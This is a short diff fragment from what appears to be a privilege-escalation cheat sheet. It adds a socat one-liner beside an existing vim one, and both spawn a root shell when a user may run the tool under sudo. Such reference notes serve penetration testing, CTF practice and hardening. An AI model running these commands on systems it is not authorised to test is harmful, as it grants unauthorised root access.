@@ -121,6 +121,12 @@ If we are allowed to run a command as sudo:
 ```ps
 $ sudo vim -c ':!/bin/sh'
 ```
+
+* Socat
+
+```ps
+$ sudo socat stdin exec:/bin/bash
+```
 </div><div>
 
 ...
